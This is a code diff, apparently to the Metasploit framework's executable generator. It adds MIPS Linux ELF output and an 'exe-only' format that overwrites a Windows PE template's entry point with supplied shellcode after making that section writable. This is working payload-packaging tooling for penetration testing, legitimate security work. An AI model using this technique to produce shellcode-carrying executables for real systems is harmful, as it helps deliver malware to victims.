@@ -120,6 +120,20 @@ require 'digest/sha1'
 			end
 			# XXX: Add PPC OS X and Linux here
 		end
+
+		if(arch.index(ARCH_MIPSLE))
+			if(plat.index(Msf::Module::Platform::Linux))
+				return to_linux_mipsle_elf(framework, code)
+			end
+			# XXX: Add remaining MIPSLE systems here
+		end
+
+		if(arch.index(ARCH_MIPSBE))
+			if(plat.index(Msf::Module::Platform::Linux))
+				return to_linux_mipsbe_elf(framework, code)
+			end
+			# XXX: Add remaining MIPSLE systems here
+		end
 		nil
 	end
 
@@ -350,9 +364,46 @@ require 'digest/sha1'
 		exe
 	end
 
+	def self.to_winpe_only(framework, code, opts={}, arch="x86")
+
+		# Allow the user to specify their own EXE template
+
+		set_template_default(opts, "template_"+arch+"_windows.exe")
+
+		pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
+
+		exe = ''
+			File.open(opts[:template], 'rb') { |fd|
+				exe = fd.read(fd.stat.size)
+			}
+
+		sections_header = []
+		pe._file_header.v['NumberOfSections'].times { |i| sections_header << [(i*0x28)+pe.rva_to_file_offset(pe._dos_header.v['e_lfanew']+pe._file_header.v['SizeOfOptionalHeader']+0x18+0x24),exe[(i*0x28)+pe.rva_to_file_offset(pe._dos_header.v['e_lfanew']+pe._file_header.v['SizeOfOptionalHeader']+0x18),0x28]] }
+
+
+		#look for section with entry point
+		sections_header.each do |sec|
+			virtualAddress = sec[1][0xc,0x4].unpack('L')[0]
+			sizeOfRawData = sec[1][0x10,0x4].unpack('L')[0]
+			characteristics = sec[1][0x24,0x4].unpack('L')[0]
+			if pe.hdr.opt.AddressOfEntryPoint >= virtualAddress && pe.hdr.opt.AddressOfEntryPoint < virtualAddress+sizeOfRawData
+				#put this section writable
+				characteristics|=0x80000000
+				newcharacteristics = [characteristics].pack('L')
+				exe[sec[0],newcharacteristics.length]=newcharacteristics
+			end
+		end
+
+		#put the shellcode at the entry point, overwriting template
+		exe[pe.rva_to_file_offset(pe.hdr.opt.AddressOfEntryPoint),code.length]=code
+
+		return exe
+	end
+
 
 	def self.to_win32pe_old(framework, code, opts={})
 
+		payload = code.dup
 		# Allow the user to specify their own EXE template
 		set_template_default(opts, "template_x86_windows_old.exe")
 
@@ -361,17 +412,17 @@ require 'digest/sha1'
 			pe = fd.read(fd.stat.size)
 		}
 
-		if(code.length < 2048)
-			code << Rex::Text.rand_text(2048-code.length)
+		if(payload.length < 2048)
+			payload << Rex::Text.rand_text(2048-payload.length)
 		end
 
-		if(code.length > 2048)
+		if(payload.length > 2048)
 			raise RuntimeError, "The EXE generator now has a max size of 2048 bytes, please fix the calling module"
 		end
 
 		bo = pe.index('PAYLOAD:')
 		raise RuntimeError, "Invalid Win32 PE OLD EXE template: missing \"PAYLOAD:\" tag" if not bo
-		pe[bo, code.length] = code
+		pe[bo, payload.length] = payload
 
 		pe[136, 4] = [rand(0x100000000)].pack('V')
 
@@ -608,7 +659,7 @@ require 'digest/sha1'
 	# segments as writable and overwrites the entrypoint (usually _start) with
 	# the payload.
 	#
-	def self.to_exe_elf(framework, opts, template, code)
+	def self.to_exe_elf(framework, opts, template, code, big_endian=false)
 
 		# Allow the user to specify their own template
 		set_template_default(opts, template)
@@ -633,11 +684,21 @@ require 'digest/sha1'
 		# Use the proper offsets and pack size
 		case elf[4]
 		when 1, "\x01" # ELFCLASS32 - 32 bit (ruby 1.8 and 1.9)
-			elf[0x44,4] = [elf.length].pack('V')  #p_filesz
-			elf[0x48,4] = [elf.length + code.length].pack('V')  #p_memsz
+			if big_endian
+				elf[0x44,4] = [elf.length].pack('N') #p_filesz
+				elf[0x48,4] = [elf.length + code.length].pack('N') #p_memsz
+			else # little endian
+				elf[0x44,4] = [elf.length].pack('V') #p_filesz
+				elf[0x48,4] = [elf.length + code.length].pack('V') #p_memsz
+			end
 		when 2, "\x02" # ELFCLASS64 - 64 bit (ruby 1.8 and 1.9)
-			elf[0x60,8] = [elf.length].pack('Q')  #p_filesz
-			elf[0x68,8] = [elf.length + code.length].pack('Q')  #p_memsz
+			if big_endian
+				elf[0x60,8] = [elf.length].pack('Q>') #p_filesz
+				elf[0x68,8] = [elf.length + code.length].pack('Q>') #p_memsz
+			else # little endian
+				elf[0x60,8] = [elf.length].pack('Q') #p_filesz
+				elf[0x68,8] = [elf.length + code.length].pack('Q') #p_memsz
+			end
 		else
 			raise RuntimeError, "Invalid ELF template: EI_CLASS value not supported"
 		end
@@ -707,6 +768,16 @@ require 'digest/sha1'
 
 	def self.to_linux_armle_elf(framework, code, opts={})
 		elf = to_exe_elf(framework, opts, "template_armle_linux.bin", code)
+		return elf
+	end
+
+	def self.to_linux_mipsle_elf(framework, code, opts={})
+		elf = to_exe_elf(framework, opts, "template_mipsle_linux.bin", code)
+		return elf
+	end
+
+	def self.to_linux_mipsbe_elf(framework, code, opts={})
+		elf = to_exe_elf(framework, opts, "template_mipsbe_linux.bin", code, true)
 		return elf
 	end
 
@@ -1896,6 +1967,15 @@ End Sub
 				output = Msf::Util::EXE.to_win32pe_old(framework, code, exeopts)
 			end
 
+		when 'exe-only'
+			if(not arch or (arch.index(ARCH_X86)))
+				output = Msf::Util::EXE.to_winpe_only(framework, code, exeopts)
+			end
+
+			if(arch and (arch.index( ARCH_X86_64 ) or arch.index( ARCH_X64 )))
+				output = Msf::Util::EXE.to_winpe_only(framework, code, exeopts, "x64")
+			end
+
 		when 'elf'
 			if (not plat or (plat.index(Msf::Module::Platform::Linux)))
 				if (not arch or (arch.index(ARCH_X86)))
@@ -1960,7 +2040,7 @@ End Sub
 	end
 
 	def self.to_executable_fmt_formats
-		['dll','exe','exe-small','elf','macho','vba','vba-exe','vbs','loop-vbs','asp','aspx','war','psh','psh-net']
+		['dll','exe','exe-small','exe-only','elf','macho','vba','vba-exe','vbs','loop-vbs','asp','aspx','war','psh','psh-net']
 	end
 
 	#
